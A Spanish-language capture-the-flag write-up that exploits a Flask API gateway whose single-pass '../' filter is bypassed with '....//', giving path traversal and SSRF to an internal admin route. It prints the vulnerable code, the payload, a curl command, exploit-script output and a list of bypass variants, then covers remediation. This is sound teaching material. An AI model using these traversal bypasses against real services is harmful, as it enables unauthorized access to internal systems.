# Write-up — Read Between the Lines

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | API |
| **Dificultad** | Medium |
| **Puntos** | 280 |
| **Flag** | `flag{e83c19f7e352fdbe}` |
| **Vulnerabilidad** | Path Traversal en gateway → SSRF a ruta interna del backend (sanitización no recursiva) |

---

## 1. Enunciado

> **ProfileHub** is a microservice employee directory. A public gateway sits in
> front of an internal backend and forwards along the requests it likes.

Instancia desplegada: `https://57e88994ebd24c94.chal.ctf.ae`

Adjunto: `read-between-the-lines.zip` (AES, password `infected`) → un único fichero,
`gateway.py`.

El reto modela una arquitectura de microservicios: un **gateway público** (Flask,
puerto 8080) que hace de proxy hacia un **backend interno** (puerto 5001) no expuesto
a Internet. La frase clave —*"forwards along the requests it likes"*— adelanta que el
gateway filtra qué rutas del backend deja pasar. El objetivo es alcanzar una ruta que
el gateway **no** pretende reenviar.

---

## 2. Reconocimiento

Solo se entrega el código del gateway, no el del backend. Lo relevante son dos rutas:

```python
BACKEND_URL = f"http://{BACKEND_HOST}:{BACKEND_PORT}"   # http://127.0.0.1:5001

def sanitize_path(user_input):
    """Neutralize path traversal sequences in user input."""
    cleaned = user_input.replace("../", "")
    cleaned = cleaned.replace("..\\", "")
    return cleaned

@app.route("/api/profile/<path:username>")
def get_profile(username):
    if not username or len(username) > 128:
        return jsonify({"error": "Invalid username"}), 400
    safe_username = sanitize_path(username)
    if not safe_username:
        return jsonify({"error": "Invalid username"}), 400
    internal_url = f"{BACKEND_URL}/users/{safe_username}"
    resp = http_client.get(internal_url, timeout=5)
    ...
```

La documentación en `/` confirma que el gateway solo expone `GET /api/users` y
`GET /api/profile/<username>`; todo perfil se resuelve contra `http://backend:5001/users/<name>`.

Sondeando `/api/users` vemos la respuesta real del backend:

```json
{"status":"ok","users":["alice","bob","carol","dave"]}
```

El gateway **solo** sabe hablar con `/users` del backend. Cualquier otra ruta interna
(p. ej. un panel admin) es inalcanzable... salvo que consigamos torcer la URL que el
gateway construye.

---

## 3. Encontrando la vulnerabilidad

Tres piezas encajan para dar un **path traversal** que sale de `/users/`:

1. **La ruta usa el convertidor `<path:username>`.** A diferencia del convertidor
   por defecto, `<path:>` acepta barras `/`, así que el nombre de usuario puede
   contener segmentos de ruta completos.

2. **`sanitize_path()` borra `../` en una sola pasada y sin recursión.** El clásico
   patrón evasivo `....//` sobrevive a la limpieza: `str.replace` encuentra el `../`
   del **medio** y lo elimina, dejando `../` intacto:

   ```
   "....//"  ->  replace("../","")  ->  "../"
   ```

   Es decir, la "neutralización" **reconstruye** justo la secuencia que pretendía
   eliminar.

3. **`requests` envía el path crudo y el backend (Werkzeug) normaliza los `..`.**
   El gateway construye `http://backend:5001/users/../<ruta>`; el backend colapsa el
   `..` y sirve `/<ruta>`.

Encadenando todo:

```
GET /api/profile/....//admin/flag
   → sanitize_path → "../admin/flag"
   → gateway pide:  http://127.0.0.1:5001/users/../admin/flag
   → Werkzeug normaliza:  /admin/flag
```

El límite `len(username) > 128` no molesta (el payload es corto) y `<path:>` ni
siquiera necesita URL-encoding de las barras.

### Validación local

Antes de tocar el remoto reproduje la arquitectura: el `gateway.py` **real** más un
backend Flask simulado con endpoints ocultos `/admin` y `/internal/flag`. El payload
`....//admin` devolvió el contenido del endpoint oculto, confirmando que (a) el bypass
de sanitización funciona y (b) `requests` + Werkzeug resuelven el `..` en el lado del
backend. Solo entonces lo lancé contra la instancia.

---

## 4. Explotación

No se conoce a priori el nombre de la ruta interna, así que se hace un pequeño fuzzing
de rutas candidatas a través del traversal. La primera en responder `200` fue
`admin/flag`:

```http
GET /api/profile/....//admin/flag HTTP/1.1
Host: 57e88994ebd24c94.chal.ctf.ae
```
```json
{"flag":"flag{e83c19f7e352fdbe}","message":"Internal admin access granted","status":"ok"}
```

> **Nota de transporte:** el certificado TLS de la instancia estaba **expirado**, por
> lo que hay que deshabilitar la verificación (`curl -k` / `requests(..., verify=False)`).

Una sola línea basta:

```bash
curl -k "https://57e88994ebd24c94.chal.ctf.ae/api/profile/....//admin/flag"
```

### Script de solución (`exploit.py`)

`exploit.py` automatiza el ataque: prueba una wordlist de rutas backend (`admin/flag`,
`internal/flag`, `secret`, ...) a profundidad de traversal 1–3, ignora el cert
expirado y extrae `flag{...}` de la respuesta.

```bash
python3 exploit.py https://57e88994ebd24c94.chal.ctf.ae
```
```
[*] sanity /api/users:
    {"status":"ok","users":["alice","bob","carol","dave"]}
[200] d1 admin/flag  {"flag":"flag{e83c19f7e352fdbe}","message":"Internal admin access granted",...}  <== FLAG

>>> flag{e83c19f7e352fdbe}
```

---

## 5. Flag

```
flag{e83c19f7e352fdbe}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** saneamiento por lista negra (*blacklist*) implementado como un
reemplazo de string **no recursivo**. Filtrar secuencias peligrosas con un
`replace("../","")` de una pasada es intrínsecamente evadible: el propio reemplazo
puede reconstruir el patrón (`....//` → `../`, `..././` → `../`, etc.). A esto se suma
que el gateway confía en la URL resultante y el backend normaliza los `..`, cerrando
la cadena hacia un SSRF a rutas internas.

**Cómo se arregla:**

- **No sanear por sustracción; validar por lista blanca.** El `username` de un
  directorio de empleados es un identificador simple: exigir `^[A-Za-z0-9_-]+$` y
  rechazar todo lo demás. Nada de `/`, `.` ni `\`.
- **No usar `<path:>` donde solo se espera un identificador.** El convertidor por
  defecto (que no acepta barras) ya habría bloqueado el traversal.
- **Construir la URL del backend de forma segura:** pasar el nombre como parámetro y
  dejar que la librería lo escape (`requests.get(base, params=...)` o URL-encoding
  explícito), en vez de interpolarlo directo en el path.
- **Segmentar el backend:** las rutas administrativas (`/admin/*`) no deberían ser
  alcanzables desde el gateway público aunque se manipule el path — autenticación
  servicio-a-servicio o allow-list de rutas en el propio backend.
- **Arreglar el TLS** (cert expirado) — irrelevante para el bug pero indicador de
  higiene operativa.

**Lección de CTF:** cuando veas una función de "sanitización" que hace `replace()` de
secuencias de traversal, prueba siempre las variantes que **se reconstruyen tras el
reemplazo** (`....//`, `..././`, `....\/`, doble/URL-encoding). Y si una ruta usa el
convertidor `<path:>` de Flask, asume que puedes inyectar segmentos de ruta completos:
el destino real de la petición puede no ser el que el desarrollador imaginó.
